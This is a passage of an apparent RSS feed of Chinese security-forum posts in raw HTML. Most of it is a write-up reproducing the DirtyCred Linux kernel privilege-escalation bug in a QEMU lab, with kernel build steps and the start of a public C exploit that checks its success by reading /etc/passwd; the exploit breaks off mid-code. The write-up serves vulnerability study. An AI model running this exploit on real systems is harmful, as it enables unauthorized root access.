class="code-snippet__built_in">free</span>(out_buf);</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">return</span> <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">}</span></code></pre><p></p><br /><p><br /><span>经测试可以修改最高充电百分比，但是只能有60%，80%和100%三种数值。<span style="color: #ff0000;">如果修改为其它数值，则默认</span></span><span><span style="color: #ff0000;">最高充电百分比为100%。</span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1902161-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Tue, 19 Mar 2024 16:10:09 +0800</pubDate>
</item>
<item>
<title>今日清除 开放注册 后一直未激活会员1320人，基本都是邮箱写错了的。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140294&amp;idx=1&amp;sn=522546657474998f6e54b8f9058ea084&amp;chksm=bd50a0928a2729848992803408fd71dc94116ac6f7449c1965cf072367bca930e4f99b31b399&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140294&amp;idx=1&amp;sn=522546657474998f6e54b8f9058ea084&amp;chksm=bd50a0928a2729848992803408fd71dc94116ac6f7449c1965cf072367bca930e4f99b31b399&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> 📅 日期：2024年3月18日
🕔 时间：17:05
📍 地点：北京

ℹ️ 消息：北京时间2024年3月18日下午5点05分

🌍 地点：北京

📌 关键信息：
1. 时间：2024年3月18日下午5点05分
2. 地点：北京

<br /> <div>
<p>
<span></span> <span>2024-03-18 17:05</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        &nbsp;<a></a>&nbsp;
                      </div>
]]></content:encoded>
<pubDate>Mon, 18 Mar 2024 17:04:44 +0800</pubDate>
</item>
<item>
<title>【漏洞分析】CVE-2021-4145 dirty cred漏洞复现</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140292&amp;idx=1&amp;sn=525c0180c43ad8028deadaa683e50c9d&amp;chksm=bd50a0908a272986b8d0075aadadf72cbc6c3af41c4d4bd5d0539b3613df059e240811370e67&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140292&amp;idx=1&amp;sn=525c0180c43ad8028deadaa683e50c9d&amp;chksm=bd50a0908a272986b8d0075aadadf72cbc6c3af41c4d4bd5d0539b3613df059e240811370e67&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-03-16 09:25</span> <span style="display: inline-block;">北京</span>
</p>

<p>CVE-2021-4145 dirty cred漏洞复现，篇文章采用的还是 环境配置——漏洞验证——源码分析——代码调试 这四部分。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=d26cc433&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKpR3hJKfFjEos8pmltE6WLpyp7ZU6ohPRN8A1xy5uKFHaOLVTfsqc4A%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>xia0ji233</strong></p><br /><p><br /></p><br /><p>复现一下 dirty cred 漏洞</p><p>&lt;!--more--&gt;</p><p>同样本篇文章采用的还是 环境配置——漏洞验证——源码分析——代码调试 这四部分。</p><h2>环境配置</h2><h3>内核编译</h3><p>选用一个漏洞存在的版本，例如 5.13.2。</p><p>下面就是编译内核会踩得一些坑，我将完整复述一遍：</p><p>源码下载好之后，先 <code style="font-family: SFMono-Regular, Consolas, ;">make menuconfig</code> 开启调试符号，<code style="font-family: SFMono-Regular, Consolas, ;">kernel hacking-&gt;kernel debugging</code> 勾选，<code style="font-family: SFMono-Regular, Consolas, ;">kernel hacking-&gt;Compile-time checks and compiler options-&gt;Compile the kernel with debug info</code> 勾选。</p><p>保存退出之后还需要加上两个选项。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">vim .config</code>，打开之后找到两个选项，一个是 <code style="font-family: SFMono-Regular, Consolas, ;">CONFIG_FUSE_FS</code> 另一个是 <code style="font-family: SFMono-Regular, Consolas, ;">CONFIG_USER_NS</code>，这两个选项都需要启动，默认生成的 <code style="font-family: SFMono-Regular, Consolas, ;">config</code> 应该是没有启用这两个选项的。</p><p>配置完成之后就可以开始编译了。</p><p>编译完成之后，在本目录下得到带完整符号的 <code style="font-family: SFMono-Regular, Consolas, ;">vmlinux</code>，在 <code style="font-family: SFMono-Regular, Consolas, ;">arch/x86/boot/</code> 得到启动内核 <code style="font-family: SFMono-Regular, Consolas, ;">bzImage</code></p><h3>文件系统编译</h3><p>依然是采用 busybox，方法和之前是一致的，看我最开始的环境搭建即可，这里可以提前把 EXP 编译进去然后打包文件系统。</p><h3>启动脚本</h3><p>就是传说中的 <code style="font-family: SFMono-Regular, Consolas, ;">start.sh</code></p><p>这里给大家参考一下我的 qemu 启动参数。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">qemu-system-x86_64 \<br />        -m 256M \<br />        -smp 2,cores=2,threads=1\<br />        -kernel ./bzImage \<br />        -initrd  ./rootfs.img \<br />        -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr"\<br />        -cpu qemu64 \<br />        -netdev user,id=t0, \<br />        -device e1000,netdev=t0,id=nic0 \<br />        -nographic \<br />        #-s -S\</code></pre><p>最后一行用于调试，大家不需要调试可以先注释掉，其它参数解释如下：</p><ol><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-m 256M</code>: 指定虚拟机的内存大小为 256MB。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-smp 2,cores=2,threads=1</code>: 指定使用 2 个 CPU，每个 CPU 拥有 2 个核心，每个核心只有一个线程。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-kernel ./bzImage</code>: 指定了内核文件。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-initrd ./rootfs.img</code>: 指定我们制作的 Linux 文件系统。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr"</code>:指定了传递给内核的启动参数。这里的 quiet 可以让内核不输出很多信息直接启动，<code style="font-family: SFMono-Regular, Consolas, ;">nokaslr</code> 一定要加，否则断点无法命中。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-cpu qemu64</code>: 指定使用 QEMU 的默认 x86_64 CPU 模拟器。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-netdev user,id=t0,</code>: 指定了用户模式网络设备。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-device e1000,netdev=t0,id=nic0</code>: 指定了要添加到虚拟机的网络设备。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-nographic</code>: 无需图形界面的情况下运行 QEMU。</p></li></ol><hr /><p>现在在目录下应该有了 <code style="font-family: SFMono-Regular, Consolas, ;">start.sh</code>，<code style="font-family: SFMono-Regular, Consolas, ;">bzImage</code> 和 <code style="font-family: SFMono-Regular, Consolas, ;">rootfs.img</code>，文件系统可以提前打包 exp 进去。</p><h2>漏洞验证</h2><h3>EXP验证</h3><p>用网上通用的一个 EXP。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> _GNU_SOURCE</span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;endian.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;errno.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;fcntl.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sched.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdarg.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdbool.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdint.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdlib.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;string.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/mman.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/mount.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/prctl.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/resource.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/stat.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/syscall.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/time.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/types.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/wait.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;unistd.h&gt;</span></span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;assert.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;pthread.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/uio.h&gt;</span></span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;linux/bpf.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;linux/kcmp.h&gt;</span></span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;linux/capability.h&gt;</span></span><br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">die</span>(<span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> *fmt, ...) {<br />    va_list params;<br /><br />    va_start(params, fmt);<br />    vfprintf(stderr, fmt, params);<br />    va_end(params);<br />    exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">use_temporary_dir</span>(<span style="color: rgb(255, 255, 182);">void</span>) {<br />    system(<span style="color: rgb(168, 255, 96);">"rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data"</span>);<br />    <span style="color: rgb(255, 255, 182);">char</span> *tmpdir = <span style="color: rgb(168, 255, 96);">"exp_dir"</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (!tmpdir)<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (chmod(tmpdir, <span style="color: rgb(255, 115, 253);">0777</span>))<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (chdir(tmpdir))<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">bool</span> <span style="color: rgb(255, 255, 182);">write_file</span>(<span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> *file, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> *what, ...) {<br />    <span style="color: rgb(255, 255, 182);">char</span> buf[<span style="color: rgb(255, 115, 253);">1024</span>];<br />    va_list args;<br />    va_start(args, what);<br />    vsnprintf(buf, sizeof(buf), what, args);<br />    va_end(args);<br />    buf[sizeof(buf) - <span style="color: rgb(255, 115, 253);">1</span>] = <span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(255, 255, 182);">int</span> len = strlen(buf);<br />    <span style="color: rgb(255, 255, 182);">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);<br />    <span style="color: rgb(150, 203, 254);">if</span> (fd == <span style="color: rgb(255, 115, 253);">-1</span>)<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (write(fd, buf, len) != len) {<br />        <span style="color: rgb(255, 255, 182);">int</span> err = errno;<br />        close(fd);<br />        errno = err;<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />    }<br />    close(fd);<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">true</span>;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">setup_common</span>() {<br />    <span style="color: rgb(150, 203, 254);">if</span> (mount(<span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(168, 255, 96);">"/sys/fs/fuse/connections"</span>, <span style="color: rgb(168, 255, 96);">"fusectl"</span>, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">0</span>)) {<br /><br />    }<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">loop</span>();<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">sandbox_common</span>() {<br />    prctl(PR_SET_PDEATHSIG, SIGKILL, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />    setsid();<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">rlimit</span> rlim;<br />    rlim.rlim_cur = rlim.rlim_max = (<span style="color: rgb(255, 115, 253);">200</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">20</span>);<br />    setrlimit(RLIMIT_AS, &amp;rlim);<br />    rlim.rlim_cur = rlim.rlim_max = <span style="color: rgb(255, 115, 253);">32</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">20</span>;<br />    setrlimit(RLIMIT_MEMLOCK, &amp;rlim);<br />    rlim.rlim_cur = rlim.rlim_max = <span style="color: rgb(255, 115, 253);">136</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">20</span>;<br />    setrlimit(RLIMIT_FSIZE, &amp;rlim);<br />    rlim.rlim_cur = rlim.rlim_max = <span style="color: rgb(255, 115, 253);">1</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">20</span>;<br />    setrlimit(RLIMIT_STACK, &amp;rlim);<br />    rlim.rlim_cur = rlim.rlim_max = <span style="color: rgb(255, 115, 253);">0</span>;<br />    setrlimit(RLIMIT_CORE, &amp;rlim);<br />    rlim.rlim_cur = rlim.rlim_max = <span style="color: rgb(255, 115, 253);">256</span>;<br />    setrlimit(RLIMIT_NOFILE, &amp;rlim);<br />    <span style="color: rgb(150, 203, 254);">if</span> (unshare(CLONE_NEWNS)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (mount(<span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(168, 255, 96);">"/"</span>, <span style="color: rgb(198, 197, 254);">NULL</span>, MS_REC | MS_PRIVATE, <span style="color: rgb(198, 197, 254);">NULL</span>)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (unshare(CLONE_NEWIPC)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (unshare(<span style="color: rgb(255, 115, 253);">0x02000000</span>)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (unshare(CLONE_NEWUTS)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (unshare(CLONE_SYSVSEM)) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> {<br />        <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> *name;<br />        <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span> *value;<br />    } <span style="color: rgb(255, 255, 182);">sysctl_t</span>;<br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">sysctl_t</span> sysctls[] = {<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/shmmax"</span>, <span style="color: rgb(168, 255, 96);">"16777216"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/shmall"</span>, <span style="color: rgb(168, 255, 96);">"536870912"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/shmmni"</span>, <span style="color: rgb(168, 255, 96);">"1024"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/msgmax"</span>, <span style="color: rgb(168, 255, 96);">"8192"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/msgmni"</span>, <span style="color: rgb(168, 255, 96);">"1024"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/msgmnb"</span>, <span style="color: rgb(168, 255, 96);">"1024"</span>},<br />        {<span style="color: rgb(168, 255, 96);">"/proc/sys/kernel/sem"</span>, <span style="color: rgb(168, 255, 96);">"1024 1048576 500 1024"</span>},<br />    };<br />    <span style="color: rgb(255, 255, 182);">unsigned</span> i;<br />    <span style="color: rgb(150, 203, 254);">for</span> (i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(sysctls) / sizeof(sysctls[<span style="color: rgb(255, 115, 253);">0</span>]); i++)<br />        write_file(sysctls[i].name, sysctls[i].value);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">wait_for_loop</span>(<span style="color: rgb(255, 255, 182);">int</span> pid) {<br />    <span style="color: rgb(150, 203, 254);">if</span> (pid &lt; <span style="color: rgb(255, 115, 253);">0</span>)<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(255, 255, 182);">int</span> status = <span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(150, 203, 254);">while</span> (waitpid(<span style="color: rgb(255, 115, 253);">-1</span>, &amp;status, __WALL) != pid) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> WEXITSTATUS(status);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">drop_caps</span>(<span style="color: rgb(255, 255, 182);">void</span>) {<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">__user_cap_header_struct</span> cap_hdr = {};<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">__user_cap_data_struct</span> cap_data[<span style="color: rgb(255, 115, 253);">2</span>] = {};<br />    cap_hdr.version = _LINUX_CAPABILITY_VERSION_3;<br />    cap_hdr.pid = getpid();<br />    <span style="color: rgb(150, 203, 254);">if</span> (syscall(SYS_capget, &amp;cap_hdr, &amp;cap_data))<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">int</span> drop = (<span style="color: rgb(255, 115, 253);">1</span> &lt;&lt; CAP_SYS_PTRACE) | (<span style="color: rgb(255, 115, 253);">1</span> &lt;&lt; CAP_SYS_NICE);<br />    cap_data[<span style="color: rgb(255, 115, 253);">0</span>].effective &amp;= ~drop;<br />    cap_data[<span style="color: rgb(255, 115, 253);">0</span>].permitted &amp;= ~drop;<br />    cap_data[<span style="color: rgb(255, 115, 253);">0</span>].inheritable &amp;= ~drop;<br />    <span style="color: rgb(150, 203, 254);">if</span> (syscall(SYS_capset, &amp;cap_hdr, &amp;cap_data))<br />        exit(<span style="color: rgb(255, 115, 253);">1</span>);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> real_uid;<br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> real_gid;<br />__attribute__((aligned(<span style="color: rgb(255, 115, 253);">64</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">10</span>))) <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">char</span> sandbox_stack[<span style="color: rgb(255, 115, 253);">1</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">20</span>];<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">namespace_sandbox_proc</span>() {<br />    sandbox_common();<br />    loop();<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">do_sandbox_namespace</span>() {<br />    setup_common();<br />    real_uid = getuid();<br />    real_gid = getgid();<br />    mprotect(sandbox_stack, <span style="color: rgb(255, 115, 253);">4096</span>, PROT_NONE);<br />    <span style="color: rgb(150, 203, 254);">while</span> (<span style="color: rgb(255, 115, 253);">1</span>) {<br />        <span style="color: rgb(255, 255, 182);">int</span> pid =<br />            clone(namespace_sandbox_proc, &amp;sandbox_stack[sizeof(sandbox_stack) - <span style="color: rgb(255, 115, 253);">64</span>],<br />                  CLONE_NEWUSER | CLONE_NEWPID, <span style="color: rgb(255, 115, 253);">0</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (pid == <span style="color: rgb(255, 115, 253);">-1</span>) {<br />            perror(<span style="color: rgb(168, 255, 96);">"clone"</span>);<br />            printf(<span style="color: rgb(168, 255, 96);">"errno: %d\n"</span>, errno);<br />        }<br />        <span style="color: rgb(255, 255, 182);">int</span> ret_status = wait_for_loop(pid);<br />        <span style="color: rgb(150, 203, 254);">if</span> (ret_status == <span style="color: rgb(255, 115, 253);">0</span>) {<br />            printf(<span style="color: rgb(168, 255, 96);">"[!] succeed\n"</span>);<br />            sleep(<span style="color: rgb(255, 115, 253);">1</span>);<br />            printf(<span style="color: rgb(168, 255, 96);">" checking /etc/passwd\n\n"</span>);<br />            printf(<span style="color: rgb(168, 255, 96);">" executing command : head -n 5 /etc/passwd\n"</span>);<br />            sleep(<span style="color: rgb(255, 115, 253);">1</span>);<br />            system(<span style="color: rgb(168, 255, 96);">"head -n 5 /etc/passwd"</span>);<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">1</span>;<br />        } <span style="color: rgb(150, 203, 254);">else</span> {<br />            printf(<span style="color: rgb(168, 255, 96);">"[-] failed to write, retry...\n\n"</span>);<br />            sleep(<span style="color: rgb(255, 115, 253);">3</span>);<br />        }<br />    }<br />}<br /><br /><span style="color: rgb(124, 124, 124);">// ===========================</span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 